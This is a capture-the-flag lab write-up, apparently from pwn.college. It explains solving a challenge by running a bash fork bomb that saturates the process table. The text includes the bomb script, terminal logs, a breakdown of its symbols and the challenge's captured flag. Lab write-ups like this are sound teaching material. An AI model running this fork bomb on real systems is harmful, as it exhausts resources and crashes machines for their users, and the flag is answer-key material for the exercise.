
# 1. The Fork Bomb

This challenge prompted me to create a fork bomb to exhaust system processes.

## My Solve

**Flag:** `pwn.college{c1R-ll7QCYSyt5FD66tvoj5EWdh.0VMyEzNxwCM2EDNzEzW}`

This required two terminals, which I set up using `screen`. In one window, I started the `/challenge/check` program. In the other, I created a fork bomb script named `fork`, made it executable, and ran it. The script rapidly created new processes until the system was saturated, which was detected by the checker, and it printed the flag.

Content of `fork`:

```
#!/bin/bash
:(){ :|:& };:
```

Terminal 1 (Checker):

```
hacker@destruction~the-fork-bomb:~$ /challenge/check
It looks like the system can still spawn processes. We'll check again in 5 seconds...
It looks like the system can still spawn processes. We'll check again in 5 seconds...
You successfully saturated the process table.  Here is your hard-earned flag:
pwn.college{c1R-ll7QCYSyt5FD66tvoj5EWdh.0VMyEzNxwCM2EDNzEzW}
```

Terminal 2 (Attack):
```
hacker@destruction~the-fork-bomb:~$ nano fork
hacker@destruction~the-fork-bomb:~$ chmod +x fork
hacker@destruction~the-fork-bomb:~$ ./fork
```

## What I Learned

A fork bomb is a denial-of-service attack. Its a piece of code that causes a process to replicate, and each time, the new instance of the program further depletes available resources. When its run a computer, it just crashes.

Breakdown of the command:

```
Symbol  Meaning             Function
:       Function name
()      Defines the function
{ ... } Function body
|       Pipe
&       Run in background
;       Command separator
:       Call the function once to start the bomb
```

## References

The problem statement provided was the reference used.

```
As you learned in the Processes and Jobs module, whenever you start a program the Linux operating system creates a new process.
If you create processes faster than the kernel can handle, the process table fills up and everything grinds to a halt.
...
This challenge contains a /challenge/check that'll try to determine if your fork bomb is working (e.g., if it can't launch new processes) and give you the flag if so.
Make sure to launch it (in a different terminal) before launching your attack; otherwise you won't be able to launch it!
```
